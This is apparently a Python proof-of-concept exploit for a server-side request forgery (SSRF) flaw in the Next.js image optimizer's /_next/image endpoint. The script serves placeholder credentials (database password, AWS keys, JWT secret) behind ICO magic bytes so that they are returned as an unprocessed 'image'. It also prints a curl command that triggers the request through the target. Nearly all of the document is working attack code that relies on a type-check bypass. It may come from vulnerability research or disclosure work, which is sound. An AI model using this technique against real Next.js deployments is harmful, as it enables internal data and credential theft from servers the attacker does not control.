#!/usr/bin/env python3
"""
ICO Data Exfiltration PoC
=========================

ICO magic bytes: 0x00 0x00 0x01 0x00 (4 bytes)
ICO is a BYPASS_TYPE - raw buffer returned without optimization.
Unlike SVG, ICO doesn't require dangerouslyAllowSVG flag!

This creates a minimal ICO file with secret data embedded after
the header. The entire buffer is returned to the attacker.
"""

from http.server import HTTPServer, BaseHTTPRequestHandler

SECRET_DATA = b'''
=== EXFILTRATED INTERNAL SECRETS ===
DATABASE_HOST=10.0.0.5
DATABASE_PORT=5432
DATABASE_USER=admin
DATABASE_PASS=super_secret_prod_password
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
JWT_SECRET=your-256-bit-jwt-secret-here
INTERNAL_API_KEY=internal_api_key_12345
REDIS_URL=redis://:password@10.0.0.8:6379
=====================================
'''

# Minimal ICO header that passes validation
# ICO magic: 0x00 0x00 0x01 0x00
ICO_HEADER = bytes([0x00, 0x00, 0x01, 0x00])

class ICOExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Prepend ICO magic bytes to secret data
        response = ICO_HEADER + SECRET_DATA
        
        print(f"\n[EXFIL] Request: {self.path}")
        print(f"[EXFIL] Returning {len(response)} bytes with ICO header")
        print(f"[EXFIL] Contains: DATABASE credentials, AWS keys, JWT secret")
        
        self.send_response(200)
        self.send_header('Content-Type', 'image/x-icon')
        self.send_header('Content-Length', len(response))
        self.end_headers()
        self.wfile.write(response)
    
    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    port = 9801
    print("=" * 60)
    print(" ICO Data Exfiltration PoC")
    print("=" * 60)
    print(f"\nListening on 127.0.0.1:{port}")
    print("\nICO magic bytes: 0x00 0x00 0x01 0x00")
    print("ICO is a BYPASS_TYPE - returns raw buffer!")
    print("=" * 60)
    print("\nTest SSRF exfiltration:")
    print(f'  curl "http://localhost:3000/_next/image?url=http://127.0.0.1:{port}/favicon.ico&w=64&q=75"')
    print("\nExpected: ICO header + SECRET DATA!")
    print("=" * 60)
    
    HTTPServer(('127.0.0.1', port), ICOExfilHandler).serve_forever()
